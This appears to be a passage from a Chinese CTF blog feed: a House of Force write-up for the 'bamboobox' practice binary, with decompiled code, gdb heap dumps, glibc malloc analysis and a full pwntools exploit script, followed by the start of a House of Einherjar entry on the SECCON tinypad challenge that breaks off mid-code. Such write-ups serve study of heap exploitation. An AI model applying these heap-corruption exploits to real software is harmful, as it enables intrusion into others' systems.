<h4 id="add-item函数如下："><a href="#add-item函数如下：" class="headerlink" title="add_item函数如下："></a>add_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add_item()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@3</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rcx@12</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@4</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+8h] [bp-18h]@2</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@2</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num &gt; 99 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;the box is full&quot;);</span><br><span class="line">LABEL_11:</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please enter the length of item name:&quot;);</span><br><span class="line">  read(0, &amp;buf, 8uLL);</span><br><span class="line">  v3 &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*&amp;itemlist[4 * i + 2] )</span><br><span class="line">      &#123;</span><br><span class="line">        itemlist[4 * i] &#x3D; v3;</span><br><span class="line">        *&amp;itemlist[4 * i + 2] &#x3D; malloc(v3);</span><br><span class="line">        printf(&quot;Please enter the name of item:&quot;);</span><br><span class="line">        *(*&amp;itemlist[4 * i + 2] + read(0, *&amp;itemlist[4 * i + 2], v3)) &#x3D; 0;</span><br><span class="line">        ++num;</span><br><span class="line">        goto LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    goto LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;invaild length&quot;);</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">LABEL_12:</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show-item函数如下："><a href="#show-item函数如下：" class="headerlink" title="show_item函数如下："></a>show_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int show_item()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 99; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *&amp;itemlist[4 * i + 2] )</span><br><span class="line">        printf(&quot;%d : %s&quot;, i, *&amp;itemlist[4 * i + 2]);</span><br><span class="line">    &#125;</span><br><span class="line">    result &#x3D; puts(byte_401089);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="change-item函数如下："><a href="#change-item函数如下：" class="headerlink" title="change_item函数如下："></a>change_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 change_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST08_4@4</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+4h] [bp-2Ch]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-20h]@3</span><br><span class="line">  char nptr; &#x2F;&#x2F; [sp+20h] [bp-10h]@4</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v2 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v2 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Please enter the length of item name:&quot;, &amp;buf);</span><br><span class="line">      read(0, &amp;nptr, 8uLL);</span><br><span class="line">      v0 &#x3D; atoi(&amp;nptr);</span><br><span class="line">      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);</span><br><span class="line">      *(*&amp;itemlist[4 * v2 + 2] + read(0, *&amp;itemlist[4 * v2 + 2], v0)) &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="remove-item函数如下："><a href="#remove-item函数如下：" class="headerlink" title="remove_item函数如下："></a>remove_item函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 remove_item()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-14h]@3</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-10h]@3</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Please enter the index of item:&quot;);</span><br><span class="line">    read(0, &amp;buf, 8uLL);</span><br><span class="line">    v1 &#x3D; atoi(&amp;buf);</span><br><span class="line">    if ( *&amp;itemlist[4 * v1 + 2] )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*&amp;itemlist[4 * v1 + 2]);</span><br><span class="line">      *&amp;itemlist[4 * v1 + 2] &#x3D; 0LL;</span><br><span class="line">      itemlist[4 * v1] &#x3D; 0;</span><br><span class="line">      puts(&quot;remove successful!!&quot;);</span><br><span class="line">      --num;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;invaild index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No item in the box&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="magic函数如下："><a href="#magic函数如下：" class="headerlink" title="magic函数如下："></a>magic函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __noreturn magic()</span><br><span class="line">&#123;</span><br><span class="line">  int fd; &#x2F;&#x2F; ST0C_4@1</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+10h] [bp-70h]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  fd &#x3D; open(&quot;.&#x2F;flag&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 0x64uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  printf(&quot;%s&quot;, &amp;buf);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>1.首先申请一个chunk1，为覆盖<code>top chunk</code>做准备。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x175c000</span><br><span class="line">0x175c000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x175c010:	0x0000000000400896	0x00000000004008b1     &lt;----hello_message，goodbye_message</span><br><span class="line">0x175c020:	0x0000000000000000	0x0000000000000041     &lt;----chunk1_size</span><br><span class="line">0x175c030:	0x0000000a61616464	0x0000000000000000</span><br><span class="line">0x175c040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ </span><br><span class="line">0x175c050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c060:	0x0000000000000000	0x0000000000020fa1     &lt;----top chunk</span><br><span class="line">0x175c070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x175c090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>2.溢出覆盖<code>top chunk</code>的size位为0xffffffffffffffff，也就是-1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;10gx 0x1028020</span><br><span class="line">0x1028020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1028030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1028060:	0x6161616161616161	0xffffffffffffffff   &lt;----top chunk</span><br></pre></td></tr></table></figure>

<p>此时<code>top chunk</code>位置<code>0x1a7c060</code></p>
<p>3.我们要覆盖的地址是<code>0x1a7c010</code>，所以我们申请的chunk就是：<code>0x1a7c010-0x10-0x1a7c060=-0x60</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   Check if a request is so large that it would wrap around zero when</span><br><span class="line">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="line">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">#define REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="line">    ((unsigned long) (req) &gt;&#x3D; (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="line">&#x2F;* pad request bytes into a usable size -- internal version *&#x2F;</span><br><span class="line">&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line">&#x2F;*  Same, except also perform argument check *&#x2F;</span><br><span class="line"></span><br><span class="line">#define checked_request2size(req, sz)                                          \</span><br><span class="line">    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        return 0;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) &#x3D; request2size(req);</span><br></pre></td></tr></table></figure>

<p>这里先要过掉第一个检查， <code>-2*MINSIZE</code>，可以pass,接下来要让我们的<br><code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code> 刚好等于=-60<br>所以要减掉个<code>SIZE_SZ</code>, -68就是malloc大小了</p>
<p>4.我们再malloc一次就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x1bb6000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0, </span><br><span class="line">  size &#x3D; 0x21, </span><br><span class="line">  fd &#x3D; 0x400d49 &lt;magic&gt;,     &lt;----可以看到已经修改成功了，退出一下就可以了。</span><br><span class="line">  bk &#x3D; 0x400d49 &lt;magic&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0, </span><br><span class="line">  size &#x3D; 0x39, </span><br><span class="line">  fd &#x3D; 0x6161616161616161, </span><br><span class="line">  bk &#x3D; 0x6161616161616161, </span><br><span class="line">  fd_nextsize &#x3D; 0x6161616161616161, </span><br><span class="line">  bk_nextsize &#x3D; 0x6161616161616161</span><br><span class="line">&#125;</span><br><span class="line">0x1bb6058 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x6161616161616161, </span><br><span class="line">  size &#x3D; 0x6161616161616161, </span><br><span class="line">  fd &#x3D; 0xffffffffffffa1, </span><br><span class="line">  bk &#x3D; 0xa, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;bamboobox&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def additem(length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def modify(idx, length, name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic &#x3D; 0x400d49</span><br><span class="line"># we must alloc enough size, so as to successfully alloc from fake topchunk</span><br><span class="line">additem(0x30, &quot;ddaa&quot;)  # idx 0</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">payload &#x3D; 0x30 * &#39;a&#39;  # idx 0&#39;s content</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 8 + p64(0xffffffffffffffff)  # top chunk&#39;s prev_size and size</span><br><span class="line"># modify topchunk&#39;s size to -1</span><br><span class="line">modify(0, 0x41, payload)</span><br><span class="line"></span><br><span class="line"># top chunk&#39;s offset to heap base</span><br><span class="line">offset_to_heap_base &#x3D; -(0x40 + 0x20)</span><br><span class="line">malloc_size &#x3D; offset_to_heap_base - 0x8</span><br><span class="line">additem(malloc_size, &quot;dada&quot;)</span><br><span class="line"></span><br><span class="line">additem(0x10, p64(magic) * 2)</span><br><span class="line">print r.recv()</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.sendline(&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/#hitcon-training-lab-11</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>House of Force</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Einherjar</title>
    <url>/2020/09/29/House-of-Einherjar/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/hB5evRjO2ngisXV.jpg" alt="alt"></p>
<a id="more"></a>

<h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p>
<p>此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><h5 id="后向合并操作"><a href="#后向合并操作" class="headerlink" title="后向合并操作"></a>后向合并操作</h5><p><code>free</code> 函数中的后向合并核心操作如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* consolidate backward *&#x2F;</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize &#x3D; prev_size(p);</span><br><span class="line">    size +&#x3D; prevsize;</span><br><span class="line">    p &#x3D; chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后向合并是合并低地址的chunk，和prev_size和prev_inuse有关，只要我们可以控制这俩个，修改prev_size的大小，我们就可以通过后向合并，将合并后的chunk定位到任何地方。</p>
<p>但是在合并的过程中需要进行unlink，需要在对应chunk构造好fake chunk来绕过unlink的检测。这种利用方式和chunk extend/overlapping比较相似。</p>
<p>这里的绕过unlink操作和之前有点不一样。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p-&gt;fd &#x3D; p</span><br><span class="line">p-&gt;bk &#x3D; p</span><br></pre></td></tr></table></figure>

<p>下面以一道例题讲解一下：</p>
<h3 id="2016-Seccon-tinypad"><a href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h3><h4 id="checksec检查："><a href="#checksec检查：" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v3; &#x2F;&#x2F; rsi@1</span><br><span class="line">  const char *v4; &#x2F;&#x2F; rdi@1</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rax@4</span><br><span class="line">  int v6; &#x2F;&#x2F; eax@7</span><br><span class="line">  signed int v7; &#x2F;&#x2F; eax@20</span><br><span class="line">  __int64 v8; &#x2F;&#x2F; rax@40</span><br><span class="line">  unsigned __int64 v9; &#x2F;&#x2F; rax@40</span><br><span class="line">  int result; &#x2F;&#x2F; eax@45</span><br><span class="line">  __int64 v11; &#x2F;&#x2F; rcx@45</span><br><span class="line">  int c; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@3</span><br><span class="line">  int i; &#x2F;&#x2F; [sp+8h] [bp-18h]@2</span><br><span class="line">  int v14; &#x2F;&#x2F; [sp+Ch] [bp-14h]@7</span><br><span class="line">  int v15; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  int v16; &#x2F;&#x2F; [sp+14h] [bp-Ch]@19</span><br><span class="line">  __int64 v17; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v17 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  v15 &#x3D; 0;</span><br><span class="line">  write_n(&amp;unk_4019F0, 1LL);</span><br><span class="line">  write_n(</span><br><span class="line">    &quot;  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;</span><br><span class="line">    &quot;&#x2F;&#x2F; _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n&quot;</span><br><span class="line">    &quot;\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     &#x2F;&#x2F;\n&quot;</span><br><span class="line">    &quot;  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;,</span><br><span class="line">    563LL);</span><br><span class="line">  v3 &#x3D; 1LL;</span><br><span class="line">  v4 &#x3D; &amp;unk_4019F0;</span><br><span class="line">  write_n(&amp;unk_4019F0, 1LL);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) &#x3D; i + 49;</span><br><span class="line">      writeln(&quot;+------------------------------------------------------------------------------+\n&quot;, 81LL);</span><br><span class="line">      write_n(&quot; #   INDEX: &quot;, 12LL);</span><br><span class="line">      writeln(&amp;c, 1LL);</span><br><span class="line">      write_n(&quot; # CONTENT: &quot;, 12LL);</span><br><span class="line">      if ( *&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 &#x3D; strlen(*&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*&amp;tinypad[16 * (i + 16LL) + 8], v5);</span><br><span class="line">      &#125;</span><br><span class="line">      v3 &#x3D; 1LL;</span><br><span class="line">      v4 &#x3D; &amp;unk_4019F0;</span><br><span class="line">      writeln(&amp;unk_4019F0, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    v14 &#x3D; 0;</span><br><span class="line">    v6 &#x3D; getcmd(v4, v3);</span><br><span class="line">    v15 &#x3D; v6;</span><br><span class="line">    if ( v6 &#x3D;&#x3D; 68 )</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      v14 &#x3D; read_int(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      if ( v14 &gt; 0 &amp;&amp; v14 &lt;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *&amp;tinypad[16 * (v14 - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          free(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);&#x2F;&#x2F;            uaf</span><br><span class="line">          *&amp;tinypad[16 * (v14 - 1 + 16LL)] &#x3D; 0LL;</span><br><span class="line">          v3 &#x3D; 9LL;</span><br><span class="line">          v4 &#x3D; &quot;\nDeleted.&quot;;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;Not used&quot;;</span><br><span class="line">          writeln(&quot;Not used&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 13LL;</span><br><span class="line">        v4 &#x3D; &quot;Invalid index&quot;;</span><br><span class="line">        writeln(&quot;Invalid index&quot;, 13LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v6 &gt; 68 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 !&#x3D; 69 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 &#x3D;&#x3D; 81 )</span><br><span class="line">          continue;</span><br><span class="line">LABEL_43:</span><br><span class="line">        v3 &#x3D; 17LL;</span><br><span class="line">        v4 &#x3D; &quot;No such a command&quot;;</span><br><span class="line">        writeln(&quot;No such a command&quot;, 17LL);</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      v14 &#x3D; read_int(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      if ( v14 &gt; 0 &amp;&amp; v14 &lt;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *&amp;tinypad[16 * (v14 - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c &#x3D; 48;</span><br><span class="line">          strcpy(tinypad, *&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) !&#x3D; 89 )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v8 &#x3D; strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v8);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v9 &#x3D; strlen(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v9, 0xAu);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y&#x2F;n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until(&amp;c, 1uLL, 0xAu);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*&amp;tinypad[16 * (v14 - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;\nEdited.&quot;;</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; 8LL;</span><br><span class="line">          v4 &#x3D; &quot;Not used&quot;;</span><br><span class="line">          writeln(&quot;Not used&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v3 &#x3D; 13LL;</span><br><span class="line">        v4 &#x3D; &quot;Invalid index&quot;;</span><br><span class="line">        writeln(&quot;Invalid index&quot;, 13LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 !&#x3D; 65 )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( v14 &lt;&#x3D; 3 &amp;&amp; *&amp;tinypad[16 * (v14 + 16LL)] )</span><br><span class="line">        